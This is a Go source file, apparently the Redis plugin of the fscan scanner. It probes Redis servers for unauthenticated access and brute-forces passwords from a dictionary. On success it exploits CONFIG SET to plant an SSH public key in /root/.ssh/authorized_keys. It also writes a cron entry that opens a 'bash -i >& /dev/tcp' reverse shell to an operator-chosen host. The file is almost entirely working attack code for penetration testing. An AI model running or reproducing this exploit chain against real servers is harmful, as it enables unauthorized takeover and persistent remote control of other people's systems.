package Plugins

import (
	"bufio"
	"fmt"
	"github.com/shadow1ng/fscan/Common"
	"io"
	"net"
	"os"
	"strings"
	"time"
)

var (
	dbfilename string // Redis database filename
	dir        string // Redis database directory
)

func RedisScan(info *Common.HostInfo) error {
	Common.LogDebug(fmt.Sprintf("Starting Redis scan: %s:%v", info.Host, info.Ports))
	starttime := time.Now().Unix()

	// First try unauthenticated connection
	flag, err := RedisUnauth(info)
	if flag && err == nil {
		Common.LogSuccess(fmt.Sprintf("Redis unauthenticated connection successful: %s:%v", info.Host, info.Ports))

		// Save unauthorized access result
		result := &Common.ScanResult{
			Time:   time.Now(),
			Type:   Common.VULN,
			Target: info.Host,
			Status: "vulnerable",
			Details: map[string]interface{}{
				"port":    info.Ports,
				"service": "redis",
				"type":    "unauthorized",
			},
		}
		Common.SaveResult(result)
		return nil
	}

	if Common.DisableBrute {
		Common.LogDebug("Brute force is disabled, ending scan")
		return nil
	}

	// Iterate through password dictionary
	for _, pass := range Common.Passwords {
		// Check for timeout
		if time.Now().Unix()-starttime > int64(Common.Timeout) {
			errMsg := fmt.Sprintf("Redis scan timeout: %s:%v", info.Host, info.Ports)
			Common.LogError(errMsg)
			return fmt.Errorf(errMsg)
		}

		pass = strings.Replace(pass, "{user}", "redis", -1)
		Common.LogDebug(fmt.Sprintf("Trying password: %s", pass))

		var lastErr error
		for retryCount := 0; retryCount < Common.MaxRetries; retryCount++ {
			if retryCount > 0 {
				Common.LogDebug(fmt.Sprintf("Retry %d: %s", retryCount+1, pass))
			}

			done := make(chan struct {
				success bool
				err     error
			})

			go func() {
				success, err := RedisConn(info, pass)
				done <- struct {
					success bool
					err     error
				}{success, err}
			}()

			var connErr error
			select {
			case result := <-done:
				if result.success {
					Common.LogSuccess(fmt.Sprintf("Redis login successful %s:%v [%s]",
						info.Host, info.Ports, pass))

					// Save weak password result
					vulnResult := &Common.ScanResult{
						Time:   time.Now(),
						Type:   Common.VULN,
						Target: info.Host,
						Status: "vulnerable",
						Details: map[string]interface{}{
							"port":     info.Ports,
							"service":  "redis",
							"type":     "weak-password",
							"password": pass,
						},
					}
					Common.SaveResult(vulnResult)
					return nil
				}
				connErr = result.err
			case <-time.After(time.Duration(Common.Timeout) * time.Second):
				connErr = fmt.Errorf("Connection timeout")
			}

			if connErr != nil {
				lastErr = connErr
				errMsg := fmt.Sprintf("Redis attempt failed %s:%v [%s] %v",
					info.Host, info.Ports, pass, connErr)
				Common.LogError(errMsg)

				if retryErr := Common.CheckErrs(connErr); retryErr != nil {
					if retryCount == Common.MaxRetries-1 {
						Common.LogDebug(fmt.Sprintf("Reached max retries: %s", pass))
						break
					}
					continue
				}
			}
			break
		}

		if lastErr != nil && Common.CheckErrs(lastErr) != nil {
			Common.LogDebug(fmt.Sprintf("Redis scan interrupted: %v", lastErr))
			return lastErr
		}
	}

	Common.LogDebug(fmt.Sprintf("Redis scan complete: %s:%v", info.Host, info.Ports))
	return nil
}

// RedisUnauth attempts Redis unauthorized access detection
func RedisUnauth(info *Common.HostInfo) (flag bool, err error) {
	realhost := fmt.Sprintf("%s:%v", info.Host, info.Ports)
	Common.LogDebug(fmt.Sprintf("Starting Redis unauthorized detection: %s", realhost))

	// Establish TCP connection
	conn, err := Common.WrapperTcpWithTimeout("tcp", realhost, time.Duration(Common.Timeout)*time.Second)
	if err != nil {
		Common.LogError(fmt.Sprintf("Redis connection failed %s: %v", realhost, err))
		return false, err
	}
	defer conn.Close()

	// Set read timeout
	if err = conn.SetReadDeadline(time.Now().Add(time.Duration(Common.Timeout) * time.Second)); err != nil {
		Common.LogError(fmt.Sprintf("Redis %s set timeout failed: %v", realhost, err))
		return false, err
	}

	// Send info command to test unauthorized access
	Common.LogDebug(fmt.Sprintf("Sending info command to: %s", realhost))
	if _, err = conn.Write([]byte("info\r\n")); err != nil {
		Common.LogError(fmt.Sprintf("Redis %s send command failed: %v", realhost, err))
		return false, err
	}

	// Read response
	reply, err := readreply(conn)
	if err != nil {
		Common.LogError(fmt.Sprintf("Redis %s read response failed: %v", realhost, err))
		return false, err
	}
	Common.LogDebug(fmt.Sprintf("Received response, length: %d", len(reply)))

	// Check unauthorized access
	if !strings.Contains(reply, "redis_version") {
		Common.LogDebug(fmt.Sprintf("Redis %s unauthorized access not found", realhost))
		return false, nil
	}

	// Unauthorized access found, get configuration
	Common.LogDebug(fmt.Sprintf("Redis %s unauthorized access found, attempting to get configuration", realhost))
	dbfilename, dir, err := getconfig(conn)
	if err != nil {
		result := fmt.Sprintf("Redis %s unauthorized access found", realhost)
		Common.LogSuccess(result)
		return true, err
	}

	// Output detailed information
	result := fmt.Sprintf("Redis %s unauthorized access found, file location:%s/%s", realhost, dir, dbfilename)
	Common.LogSuccess(result)

	// Attempt vulnerability exploitation
	Common.LogDebug(fmt.Sprintf("Attempting Redis %s vulnerability exploitation", realhost))
	if err = Expoilt(realhost, conn); err != nil {
		Common.LogError(fmt.Sprintf("Redis %s vulnerability exploitation failed: %v", realhost, err))
	}

	return true, nil
}

// RedisConn attempts Redis connection
func RedisConn(info *Common.HostInfo, pass string) (bool, error) {
	realhost := fmt.Sprintf("%s:%v", info.Host, info.Ports)
	Common.LogDebug(fmt.Sprintf("Attempting Redis connection: %s [%s]", realhost, pass))

	// Establish TCP connection
	conn, err := Common.WrapperTcpWithTimeout("tcp", realhost, time.Duration(Common.Timeout)*time.Second)
	if err != nil {
		Common.LogDebug(fmt.Sprintf("Connection failed: %v", err))
		return false, err
	}
	defer conn.Close()

	// Set timeout
	if err = conn.SetReadDeadline(time.Now().Add(time.Duration(Common.Timeout) * time.Second)); err != nil {
		Common.LogDebug(fmt.Sprintf("Set timeout failed: %v", err))
		return false, err
	}

	// Send authentication command
	authCmd := fmt.Sprintf("auth %s\r\n", pass)
	Common.LogDebug("Sending authentication command")
	if _, err = conn.Write([]byte(authCmd)); err != nil {
		Common.LogDebug(fmt.Sprintf("Send authentication command failed: %v", err))
		return false, err
	}

	// Read response
	reply, err := readreply(conn)
	if err != nil {
		Common.LogDebug(fmt.Sprintf("Read response failed: %v", err))
		return false, err
	}
	Common.LogDebug(fmt.Sprintf("Received response: %s", reply))

	// Authentication successful
	if strings.Contains(reply, "+OK") {
		Common.LogDebug("Authentication successful, getting configuration information")

		// Get configuration information
		dbfilename, dir, err = getconfig(conn)
		if err != nil {
			result := fmt.Sprintf("Redis authentication successful %s [%s]", realhost, pass)
			Common.LogSuccess(result)
			Common.LogDebug(fmt.Sprintf("Get configuration failed: %v", err))
			return true, err
		}

		result := fmt.Sprintf("Redis authentication successful %s [%s] file location:%s/%s",
			realhost, pass, dir, dbfilename)
		Common.LogSuccess(result)

		// Attempt exploitation
		Common.LogDebug("Attempting Redis exploitation")
		err = Expoilt(realhost, conn)
		if err != nil {
			Common.LogDebug(fmt.Sprintf("Exploitation failed: %v", err))
		}
		return true, err
	}

	Common.LogDebug("Authentication failed")
	return false, err
}

// Expoilt attempts Redis vulnerability exploitation
func Expoilt(realhost string, conn net.Conn) error {
	Common.LogDebug(fmt.Sprintf("Starting Redis vulnerability exploitation: %s", realhost))

	// If configured not to test, return directly
	if Common.DisableRedis {
		Common.LogDebug("Redis vulnerability exploitation is disabled")
		return nil
	}

	// Test directory write permissions
	Common.LogDebug("Testing directory write permissions")
	flagSsh, flagCron, err := testwrite(conn)
	if err != nil {
		Common.LogError(fmt.Sprintf("Redis %v test write permissions failed: %v", realhost, err))
		return err
	}

	// SSH key write test
	if flagSsh {
		Common.LogSuccess(fmt.Sprintf("Redis %v writable path /root/.ssh/", realhost))

		// If the key file is specified, try to write
		if Common.RedisFile != "" {
			Common.LogDebug(fmt.Sprintf("Attempting to write SSH key: %s", Common.RedisFile))
			writeok, text, err := writekey(conn, Common.RedisFile)
			if err != nil {
				Common.LogError(fmt.Sprintf("Redis %v SSH key write error: %v %v", realhost, text, err))
				return err
			}

			if writeok {
				Common.LogSuccess(fmt.Sprintf("Redis %v SSH public key write successful", realhost))
			} else {
				Common.LogError(fmt.Sprintf("Redis %v SSH public key write failed: %v", realhost, text))
			}
		} else {
			Common.LogDebug("SSH key file not specified, skipping write")
		}
	} else {
		Common.LogDebug("SSH directory not writable")
	}

	// Cron job write test
	if flagCron {
		Common.LogSuccess(fmt.Sprintf("Redis %v writable path /var/spool/cron/", realhost))

		// If the shell command is specified, try to write the cron job
		if Common.RedisShell != "" {
			Common.LogDebug(fmt.Sprintf("Attempting to write cron job: %s", Common.RedisShell))
			writeok, text, err := writecron(conn, Common.RedisShell)
			if err != nil {
				Common.LogError(fmt.Sprintf("Redis %v cron job write error: %v", realhost, err))
				return err
			}

			if writeok {
				Common.LogSuccess(fmt.Sprintf("Redis %v successfully wrote to /var/spool/cron/root", realhost))
			} else {
				Common.LogError(fmt.Sprintf("Redis %v cron job write failed: %v", realhost, text))
			}
		} else {
			Common.LogDebug("Shell command not specified, skipping cron job write")
		}
	} else {
		Common.LogDebug("Cron directory not writable")
	}

	// Restore database configuration
	Common.LogDebug("Starting to restore database configuration")
	if err = recoverdb(dbfilename, dir, conn); err != nil {
		Common.LogError(fmt.Sprintf("Redis %v restore database failed: %v", realhost, err))
	} else {
		Common.LogDebug("Database configuration restored successfully")
	}

	Common.LogDebug(fmt.Sprintf("Redis vulnerability exploitation complete: %s", realhost))
	return err
}

// writekey writes SSH key to Redis
func writekey(conn net.Conn, filename string) (flag bool, text string, err error) {
	Common.LogDebug(fmt.Sprintf("Starting to write SSH key, file: %s", filename))
	flag = false

	// Set file directory to SSH directory
	Common.LogDebug("Setting directory: /root/.ssh/")
	if _, err = conn.Write([]byte("CONFIG SET dir /root/.ssh/\r\n")); err != nil {
		Common.LogDebug(fmt.Sprintf("Set directory failed: %v", err))
		return flag, text, err
	}
	if text, err = readreply(conn); err != nil {
		Common.LogDebug(fmt.Sprintf("Read response failed: %v", err))
		return flag, text, err
	}

	// Set filename to authorized_keys
	if strings.Contains(text, "OK") {
		Common.LogDebug("Setting filename: authorized_keys")
		if _, err = conn.Write([]byte("CONFIG SET dbfilename authorized_keys\r\n")); err != nil {
			Common.LogDebug(fmt.Sprintf("Set filename failed: %v", err))
			return flag, text, err
		}
		if text, err = readreply(conn); err != nil {
			Common.LogDebug(fmt.Sprintf("Read response failed: %v", err))
			return flag, text, err
		}

		// Read and write SSH key
		if strings.Contains(text, "OK") {
			// Read key file
			Common.LogDebug(fmt.Sprintf("Reading key file: %s", filename))
			key, err := Readfile(filename)
			if err != nil {
				text = fmt.Sprintf("Read key file %s failed: %v", filename, err)
				Common.LogDebug(text)
				return flag, text, err
			}
			if len(key) == 0 {
				text = fmt.Sprintf("Key file %s is empty", filename)
				Common.LogDebug(text)
				return flag, text, err
			}
			Common.LogDebug(fmt.Sprintf("Key content length: %d", len(key)))

			// Write key
			Common.LogDebug("Writing key content")
			if _, err = conn.Write([]byte(fmt.Sprintf("set x \"\\n\\n\\n%v\\n\\n\\n\"\r\n", key))); err != nil {
				Common.LogDebug(fmt.Sprintf("Write key failed: %v", err))
				return flag, text, err
			}
			if text, err = readreply(conn); err != nil {
				Common.LogDebug(fmt.Sprintf("Read response failed: %v", err))
				return flag, text, err
			}

			// Save changes
			if strings.Contains(text, "OK") {
				Common.LogDebug("Saving changes")
				if _, err = conn.Write([]byte("save\r\n")); err != nil {
					Common.LogDebug(fmt.Sprintf("Save failed: %v", err))
					return flag, text, err
				}
				if text, err = readreply(conn); err != nil {
					Common.LogDebug(fmt.Sprintf("Read response failed: %v", err))
					return flag, text, err
				}
				if strings.Contains(text, "OK") {
					Common.LogDebug("SSH key write successful")
					flag = true
				}
			}
		}
	}

	// Truncate long response text
	text = strings.TrimSpace(text)
	if len(text) > 50 {
		text = text[:50]
	}
	Common.LogDebug(fmt.Sprintf("SSH key write complete, status: %v, response: %s", flag, text))
	return flag, text, err
}

// writecron writes cron job to Redis
func writecron(conn net.Conn, host string) (flag bool, text string, err error) {
	Common.LogDebug(fmt.Sprintf("Starting to write cron job, target address: %s", host))
	flag = false

	// First try Ubuntu system cron path
	Common.LogDebug("Trying Ubuntu system path: /var/spool/cron/crontabs/")
	if _, err = conn.Write([]byte("CONFIG SET dir /var/spool/cron/crontabs/\r\n")); err != nil {
		Common.LogDebug(fmt.Sprintf("Set Ubuntu path failed: %v", err))
		return flag, text, err
	}
	if text, err = readreply(conn); err != nil {
		Common.LogDebug(fmt.Sprintf("Read response failed: %v", err))
		return flag, text, err
	}

	// If Ubuntu path fails, try CentOS system cron path
	if !strings.Contains(text, "OK") {
		Common.LogDebug("Trying CentOS system path: /var/spool/cron/")
		if _, err = conn.Write([]byte("CONFIG SET dir /var/spool/cron/\r\n")); err != nil {
			Common.LogDebug(fmt.Sprintf("Set CentOS path failed: %v", err))
			return flag, text, err
		}
		if text, err = readreply(conn); err != nil {
			Common.LogDebug(fmt.Sprintf("Read response failed: %v", err))
			return flag, text, err
		}
	}

	// If directory is set successfully, continue with subsequent operations
	if strings.Contains(text, "OK") {
		Common.LogDebug("Successfully set cron directory")

		// Set database filename to root
		Common.LogDebug("Setting filename: root")
		if _, err = conn.Write([]byte("CONFIG SET dbfilename root\r\n")); err != nil {
			Common.LogDebug(fmt.Sprintf("Set filename failed: %v", err))
			return flag, text, err
		}
		if text, err = readreply(conn); err != nil {
			Common.LogDebug(fmt.Sprintf("Read response failed: %v", err))
			return flag, text, err
		}

		if strings.Contains(text, "OK") {
			// Parse target host address
			target := strings.Split(host, ":")
			if len(target) < 2 {
				Common.LogDebug(fmt.Sprintf("Host address format error: %s", host))
				return flag, "Host address format error", err
			}
			scanIp, scanPort := target[0], target[1]
			Common.LogDebug(fmt.Sprintf("Target address parsed: IP=%s, Port=%s", scanIp, scanPort))

			// Write reverse shell cron job
			Common.LogDebug("Writing cron job")
			cronCmd := fmt.Sprintf("set xx \"\\n* * * * * bash -i >& /dev/tcp/%v/%v 0>&1\\n\"\r\n",
				scanIp, scanPort)
			if _, err = conn.Write([]byte(cronCmd)); err != nil {
				Common.LogDebug(fmt.Sprintf("Write cron job failed: %v", err))
				return flag, text, err
			}
			if text, err = readreply(conn); err != nil {
				Common.LogDebug(fmt.Sprintf("Read response failed: %v", err))
				return flag, text, err
			}

			// Save changes
			if strings.Contains(text, "OK") {
				Common.LogDebug("Saving changes")
				if _, err = conn.Write([]byte("save\r\n")); err != nil {
					Common.LogDebug(fmt.Sprintf("Save failed: %v", err))
					return flag, text, err
				}
				if text, err = readreply(conn); err != nil {
					Common.LogDebug(fmt.Sprintf("Read response failed: %v", err))
					return flag, text, err
				}
				if strings.Contains(text, "OK") {
					Common.LogDebug("Cron job write successful")
					flag = true
				}
			}
		}
	}

	// Truncate long response text
	text = strings.TrimSpace(text)
	if len(text) > 50 {
		text = text[:50]
	}
	Common.LogDebug(fmt.Sprintf("Cron job write complete, status: %v, response: %s", flag, text))
	return flag, text, err
}

// Readfile reads file content and returns the first non-empty line
func Readfile(filename string) (string, error) {
	Common.LogDebug(fmt.Sprintf("Reading file: %s", filename))

	file, err := os.Open(filename)
	if err != nil {
		Common.LogDebug(fmt.Sprintf("Open file failed: %v", err))
		return "", err
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		text := strings.TrimSpace(scanner.Text())
		if text != "" {
			Common.LogDebug("Found non-empty line")
			return text, nil
		}
	}
	Common.LogDebug("File content is empty")
	return "", err
}

// readreply reads Redis server response
func readreply(conn net.Conn) (string, error) {
	Common.LogDebug("Reading Redis response")
	// Set 1 second read timeout
	conn.SetReadDeadline(time.Now().Add(time.Second))

	bytes, err := io.ReadAll(conn)
	if len(bytes) > 0 {
		Common.LogDebug(fmt.Sprintf("Received response, length: %d", len(bytes)))
		err = nil
	} else {
		Common.LogDebug("No response data received")
	}
	return string(bytes), err
}

// testwrite tests Redis write permissions
func testwrite(conn net.Conn) (flag bool, flagCron bool, err error) {
	Common.LogDebug("Starting to test Redis write permissions")

	// Test SSH directory write permissions
	Common.LogDebug("Testing /root/.ssh/ directory write permissions")
	if _, err = conn.Write([]byte("CONFIG SET dir /root/.ssh/\r\n")); err != nil {
		Common.LogDebug(fmt.Sprintf("Send SSH directory test command failed: %v", err))
		return flag, flagCron, err
	}
	text, err := readreply(conn)
	if err != nil {
		Common.LogDebug(fmt.Sprintf("Read SSH directory test response failed: %v", err))
		return flag, flagCron, err
	}
	Common.LogDebug(fmt.Sprintf("SSH directory test response: %s", text))
	if strings.Contains(text, "OK") {
		flag = true
		Common.LogDebug("SSH directory writable")
	} else {
		Common.LogDebug("SSH directory not writable")
	}

	// Test cron job directory write permissions
	Common.LogDebug("Testing /var/spool/cron/ directory write permissions")
	if _, err = conn.Write([]byte("CONFIG SET dir /var/spool/cron/\r\n")); err != nil {
		Common.LogDebug(fmt.Sprintf("Send cron job directory test command failed: %v", err))
		return flag, flagCron, err
	}
	text, err = readreply(conn)
	if err != nil {
		Common.LogDebug(fmt.Sprintf("Read cron job directory test response failed: %v", err))
		return flag, flagCron, err
	}
	Common.LogDebug(fmt.Sprintf("Cron job directory test response: %s", text))
	if strings.Contains(text, "OK") {
		flagCron = true
		Common.LogDebug("Cron job directory writable")
	} else {
		Common.LogDebug("Cron job directory not writable")
	}

	Common.LogDebug(fmt.Sprintf("Write permissions test complete - SSH permissions: %v, Cron permissions: %v", flag, flagCron))
	return flag, flagCron, err
}

// getconfig gets Redis configuration information
func getconfig(conn net.Conn) (dbfilename string, dir string, err error) {
	Common.LogDebug("Starting to get Redis configuration information")

	// Get database filename
	Common.LogDebug("Getting database filename")
	if _, err = conn.Write([]byte("CONFIG GET dbfilename\r\n")); err != nil {
		Common.LogDebug(fmt.Sprintf("Get database filename failed: %v", err))
		return
	}
	text, err := readreply(conn)
	if err != nil {
		Common.LogDebug(fmt.Sprintf("Read database filename response failed: %v", err))
		return
	}

	// Parse database filename
	text1 := strings.Split(text, "\r\n")
	if len(text1) > 2 {
		dbfilename = text1[len(text1)-2]
	} else {
		dbfilename = text1[0]
	}
	Common.LogDebug(fmt.Sprintf("Database filename: %s", dbfilename))

	// Get database directory
	Common.LogDebug("Getting database directory")
	if _, err = conn.Write([]byte("CONFIG GET dir\r\n")); err != nil {
		Common.LogDebug(fmt.Sprintf("Get database directory failed: %v", err))
		return
	}
	text, err = readreply(conn)
	if err != nil {
		Common.LogDebug(fmt.Sprintf("Read database directory response failed: %v", err))
		return
	}

	// Parse database directory
	text1 = strings.Split(text, "\r\n")
	if len(text1) > 2 {
		dir = text1[len(text1)-2]
	} else {
		dir = text1[0]
	}
	Common.LogDebug(fmt.Sprintf("Database directory: %s", dir))

	return
}

// recoverdb restores Redis database configuration
func recoverdb(dbfilename string, dir string, conn net.Conn) (err error) {
	Common.LogDebug("Starting to restore Redis database configuration")

	// Restore database filename
	Common.LogDebug(fmt.Sprintf("Restoring database filename: %s", dbfilename))
	if _, err = conn.Write([]byte(fmt.Sprintf("CONFIG SET dbfilename %s\r\n", dbfilename))); err != nil {
		Common.LogDebug(fmt.Sprintf("Restore database filename failed: %v", err))
		return
	}
	if _, err = readreply(conn); err != nil {
		Common.LogDebug(fmt.Sprintf("Read restore filename response failed: %v", err))
		return
	}

	// Restore database directory
	Common.LogDebug(fmt.Sprintf("Restoring database directory: %s", dir))
	if _, err = conn.Write([]byte(fmt.Sprintf("CONFIG SET dir %s\r\n", dir))); err != nil {
		Common.LogDebug(fmt.Sprintf("Restore database directory failed: %v", err))
		return
	}
	if _, err = readreply(conn); err != nil {
		Common.LogDebug(fmt.Sprintf("Read restore directory response failed: %v", err))
		return
	}

	Common.LogDebug("Database configuration restored successfully")
	return
}
